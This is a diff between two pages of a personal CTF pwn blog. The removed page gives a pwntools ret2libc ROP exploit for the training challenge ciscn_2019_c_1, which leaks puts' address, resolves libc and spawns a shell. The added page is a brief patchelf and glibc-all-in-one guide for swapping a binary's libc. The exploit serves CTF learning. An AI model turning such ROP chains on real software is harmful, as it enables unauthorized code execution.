@@ -16,23 +16,24 @@
   <meta name="author" content="Isolator">
   <meta name="keywords" content="">
   
-    <meta name="description" content="exp">
+    <meta name="description" content="修改libc版本">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ROP ciscn_2019_c_1">
-<meta property="og:url" content="https://isolator-1.github.io/2022/11/16/ROP%20ciscn_2019_c_1/index.html">
+<meta property="og:title" content="patchelf修改libc版本">
+<meta property="og:url" content="https://isolator-1.github.io/2022/11/27/patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8Flibc%E7%89%88%E6%9C%AC/index.html">
 <meta property="og:site_name" content="Isolator&#39;s Blog">
-<meta property="og:description" content="exp">
+<meta property="og:description" content="修改libc版本">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-11-16T11:07:00.000Z">
-<meta property="article:modified_time" content="2022-11-28T04:33:16.332Z">
+<meta property="og:image" content="https://isolator-1.github.io/img/patchelf/1.png">
+<meta property="article:published_time" content="2022-11-27T08:00:00.000Z">
+<meta property="article:modified_time" content="2022-11-27T08:04:03.223Z">
 <meta property="article:author" content="Isolator">
 <meta property="article:tag" content="ctf-pwn">
-<meta property="article:tag" content="exp">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://isolator-1.github.io/img/patchelf/1.png">
   
   
   
-  <title>ROP ciscn_2019_c_1 - Isolator&#39;s Blog</title>
+  <title>patchelf修改libc版本 - Isolator&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -197,7 +198,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="ROP ciscn_2019_c_1"></span>
+            <span id="subtitle" data-typed-text="patchelf修改libc版本"></span>
           
         </div>
 
@@ -208,8 +209,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-11-16 19:07" pubdate>
-          November 16, 2022 pm
+        <time datetime="2022-11-27 16:00" pubdate>
+          November 27, 2022 pm
         </time>
       </span>
     
@@ -220,7 +221,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.4k words
+          425 words
         
       </span>
     
@@ -231,7 +232,7 @@
         
         
         
-          12 mins
+          4 mins
         
       </span>
     
@@ -269,15 +270,19 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">ROP ciscn_2019_c_1</h1>
+            <h1 style="display: none">patchelf修改libc版本</h1>
             
             
               <div class="markdown-body">
                 
-                <p><strong>题目</strong></p>
-<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_c_1">https://buuoj.cn/challenges#ciscn_2019_c_1</a></p>
-<p><strong>Exp</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,29563) </span><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><br>ret=<span class="hljs-number">0x4006b9</span><br>rdi=<span class="hljs-number">0x400c83</span><br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-comment">#第一次攻击绕过函数</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your choice!\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;\0&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">1</span>+<span class="hljs-number">8</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)<br> <br> <br> <br>p.recvline()	<span class="hljs-comment">#接收字符串Ciphertext</span><br>p.recvline()    <span class="hljs-comment">#加密后的密文</span><br><span class="hljs-comment">#这里注意需要接收2次</span><br> <br>puts_addr=u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))  <span class="hljs-comment">#得到 puts 函数 的地址</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr) <span class="hljs-comment">#获取libc的版本</span><br>offset=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>) <span class="hljs-comment">#计算偏移量</span><br>binsh=offset+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>) <span class="hljs-comment">#计算字符串&quot;/bin/sh&quot;的地址</span><br>system=offset+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>) <span class="hljs-comment">#计算函数system的地址</span><br> <br><span class="hljs-comment">#第二次攻击getshell</span><br> <br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your choice!\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)     <span class="hljs-comment">#   再一次执行 一遍流程</span><br>payload=<span class="hljs-string">b&#x27;\0&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">1</span>+<span class="hljs-number">8</span>)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)<br>p.interactive()<br><br><br><br><span class="hljs-comment"># ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</span><br><span class="hljs-comment"># https://www.cnblogs.com/ZIKH26/articles/15996874.html</span><br></code></pre></td></tr></table></figure>
+                <h4 id="安装glibc-all-in-one"><a href="#安装glibc-all-in-one" class="headerlink" title="安装glibc-all-in-one"></a>安装glibc-all-in-one</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/matrix1001/glibc-all-in-one<br>cd glibc-all-in-one<br>./update_list<br>cat list <br>./download &lt;libc-in-list&gt;<br></code></pre></td></tr></table></figure>
+
+<h4 id="修改libc-so和ld-so"><a href="#修改libc-so和ld-so" class="headerlink" title="修改libc.so和ld.so"></a>修改libc.so和ld.so</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">patchelf --set-interpreter ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so  &lt;path-to-elf&gt;<br><br>patchelf --replace-needed libc.so.6 ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6  &lt;path-to-elf&gt;<br><span class="hljs-comment"># param1 : old libc.so</span><br><span class="hljs-comment"># param2 : new libc.so</span><br><span class="hljs-comment"># param3 : path to elf</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h4><p><img src="/img/patchelf/1.png" srcset="/img/loading.gif" lazyload></p>
+
                 
               </div>
             
@@ -291,8 +296,6 @@
       
         <a href="/tags/ctf-pwn/">#ctf-pwn</a>
       
-        <a href="/tags/exp/">#exp</a>
-      
     </div>
   
 </div>
@@ -303,8 +306,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>ROP ciscn_2019_c_1</div>
-      <div>https://isolator-1.github.io/2022/11/16/ROP ciscn_2019_c_1/</div>
+      <div>patchelf修改libc版本</div>
+      <div>https://isolator-1.github.io/2022/11/27/patchelf修改程序libc版本/</div>
     </div>
     <div class="license-meta">
       
@@ -316,7 +319,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>November 16, 2022</div>
+          <div>November 27, 2022</div>
         </div>
       
       
@@ -348,9 +351,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/11/18/heap%20exploitation/" title="Heap Exploitation">
+                      <a href="/2022/11/27/Off-By-One/" title="Off-By-One">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Heap Exploitation</span>
+                        <span class="hidden-mobile">Off-By-One</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -358,8 +361,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/11/16/HarekazeCTF2019baby_rop/" title="HarekazeCTF2019 baby_rop">
-                        <span class="hidden-mobile">HarekazeCTF2019 baby_rop</span>
+                      <a href="/2022/11/25/unlink/" title="unlink">
+                        <span class="hidden-mobile">unlink</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
